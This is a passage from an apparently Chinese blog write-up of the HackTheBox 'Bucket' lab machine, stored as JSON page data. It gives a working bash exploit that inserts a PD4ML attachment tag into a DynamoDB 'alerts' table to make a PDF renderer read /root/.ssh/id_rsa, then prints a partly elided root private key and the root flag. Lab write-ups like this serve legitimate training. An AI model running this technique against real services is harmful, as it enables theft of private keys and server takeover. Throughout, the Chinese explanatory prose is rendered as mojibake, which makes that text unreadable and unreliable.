http://bucket.htb:4567\n</code></pre>\n<pre><code class=\"hljs language-bash\">aws dynamodb tables-list --endpoint-url http://bucket.htb:4567\n{\n    <span class=\"hljs-string\">\"TableNames\"</span>: [\n        <span class=\"hljs-string\">\"Music\"</span>,\n        <span class=\"hljs-string\">\"alerts\"</span>,\n        <span class=\"hljs-string\">\"users\"</span>\n    ]\n}\n</code></pre>\n<p>ä½†æ˜¯æˆ‘ä»¬èƒ½å‘ç°ä¸€ä¼šåï¼Œ<code>alerts</code>è¡¨å°±ä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡è„šæœ¬æ¥æ‰§è¡Œæ“ä½œ</p>\n<p>å°è¯•åŒ…å«æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹<code>pd4ml</code>çš„æ–‡æ¡£ï¼Œå…¶ä¸­æœ‰ä¸€é¡¹æ˜¯æ·»åŠ é™„ä»¶ï¼š<a href=\"https://pd4ml.com/support-topics/usage-examples/#add-attachment\">https://pd4ml.com/support-topics/usage-examples/#add-attachment</a></p>\n<pre><code class=\"hljs language-bash\">&#x3C;html>&#x3C;pd4ml:attachment style=\\\"align: right\\\" <span class=\"hljs-built_in\">type</span>=\\\"paperclip\\\" src=\\\"/root/root.txt\\\"/>&#x3C;/html>\n</code></pre>\n<p>ç¼–å†™è„šæœ¬</p>\n<pre><code class=\"hljs language-bash\"><span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'create table alerts\\n'</span>\naws dynamodb create-table \\\n    --table-name alerts \\\n    --attribute-definitions \\\n        AttributeName=title,AttributeType=S \\\n        AttributeName=data,AttributeType=S \\\n    --key-schema \\\n        AttributeName=title,KeyType=HASH \\\n        AttributeName=data,KeyType=RANGE \\\n    --provisioned-throughput \\\n        ReadCapacityUnits=5,WriteCapacityUnits=5 \\\n    --endpoint-url http://bucket.htb:4567\n\n<span class=\"hljs-built_in\">sleep</span> 2;\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'create talbe success?\\n'</span>\naws dynamodb list-tables --endpoint-url http://bucket.htb:4567\n<span class=\"hljs-built_in\">sleep</span> 2;\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'Insert data:\\n'</span>\naws dynamodb put-item \\\n    --table-name alerts  \\\n    --item \\\n        <span class=\"hljs-string\">'{\"title\": {\"S\": \"Ransomware\"}, \"data\": {\"S\": \"&#x3C;pd4ml:attachment description=\\\"attached.txt\\\" icon=\\\"PushPin\\\">file:///root/.ssh/id_rsa&#x3C;/pd4ml:attachment>\"}}'</span> \\\n    --endpoint-url http://bucket.htb:4567\n<span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">'POST endpoint &#x26;&#x26; copy the file'</span>\ncurl http://bucket.htb:8001 -X POST -d <span class=\"hljs-string\">'action=get_alerts'</span>\n</code></pre>\n<p>æŸ¥çœ‹ <code>result.pdf</code> ï¼Œèƒ½æ‹¿åˆ°ç§é’¥</p>\n<pre><code class=\"hljs language-bash\">-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn\nNhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU\n......\npHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/\nlt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1\nxMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg==\n-----END OPENSSH PRIVATE KEY-----\n</code></pre>\n<p>é€šè¿‡ç§é’¥ç™»å½•åï¼Œè¯»å– <code>root.txt</code></p>\n<pre><code class=\"hljs language-bash\">root@bucket:~# <span class=\"hljs-built_in\">cat</span> root.txt \n880bb2407bd062f1f9896875e8d049bf\n</code></pre>\n<h2>æ€»ç»“</h2>\n<p>åˆä¸€æ¬¡æ„Ÿåˆ°è‡ªå·±æ˜¯çœŸçš„æ— è€å¿ƒâ€¦ä¸€çƒ¦èºèµ·æ¥å°±æ— æ³•æ€è€ƒã€‚ã€‚è¿™æ¬¡ç¢°åˆ°æ–°ä¸œè¥¿ï¼Œå¡äº†è¿˜æ˜¯è›®ä¹…çš„ï¼Œä¸è¿‡åˆ©ç”¨éƒ½æ²¡ä»€ä¹ˆæŒ¡ä½çš„åœ°æ–¹ï¼Œé™¤äº†æœ€åçš„è¯»å–æ–‡ä»¶ã€‚</p>\n<p>å­¦ä¹ åˆ°äº† <code>AWS S3</code>ï¼Œä»¥åŠä¸€äº›<code>Dynamodb</code> çš„çŸ¥è¯†</p>","title":"HackTheBox - Machine - Bucket","date":"2025-06-06","updated":"2025-06-06","tags":["HackTheBox","Linux","AWS_S3","Dynamodb","PD4ML"],"categories":"é¶æœº","comments":true,"description":"Machine - Bucket\n\n https://app.hackthebox.com/machines/Bucket | `Linux` | `Medium`\n \n\n\n\nRecon\n\nç«¯å£æ‰«æ\n\n\n\n\n\nè®¿é—® `HTTP`\n\n\n\nä¸»é¡µä¸Šæ²¡æœ‰ä¸€ç‚¹ä¿¡æ¯ï¼Œå¯¹ç›®å½•è¿›è¡Œçˆ†ç ´\n\n\n\nä½†æ˜¯æˆ‘æ³¨æ„åˆ°æºä»£ç ä¸­çš„å›¾ç‰‡æ˜¯é€šè¿‡å­åŸŸå`http://s3.bucket.htb` ä¸­è·å–çš„\n\n\n\nå°†å…¶æ·»åŠ åˆ° `host..."},"recentPosts":[{"id":"HackTheBoxSeason8 - Mirage","title":"HackTheBox - Season8 - Mirage","date":"2025-07-22","isEncrypted":true,"year":"2025","month":"07","day":"22"},{"id":"TheHackersLabsCuriosity2","title":"TheHackersLabs - Curiosity2","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsCuriosity","title":"TheHackersLabs - Curiosity","date":"2025-07-19","isEncrypted":false,"year":"2025","month":"07","day":"19"},{"id":"TheHackersLabsB I G","title":"TheHackersLabs - B.I.G","date":"2025-07-18","isEncrypted":false,"year":"2025","month":"07","day":"18"},{"id":"TheHackersLabsBlackGold","title":"TheHackersLabs - BlackGold","date":"2025-07-15","isEncrypted":false,"year":"2025","month":"07","day":"15"},{"id":"TheHackersLabsSedition","title":"TheHackersLabs - Sedition","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"},{"id":"HackMyVMXimai","title":"HackMyVM - Ximai","date":"2025-07-14","isEncrypted":false,"year":"2025","month":"07","day":"14"}]},"__N_SSG":true}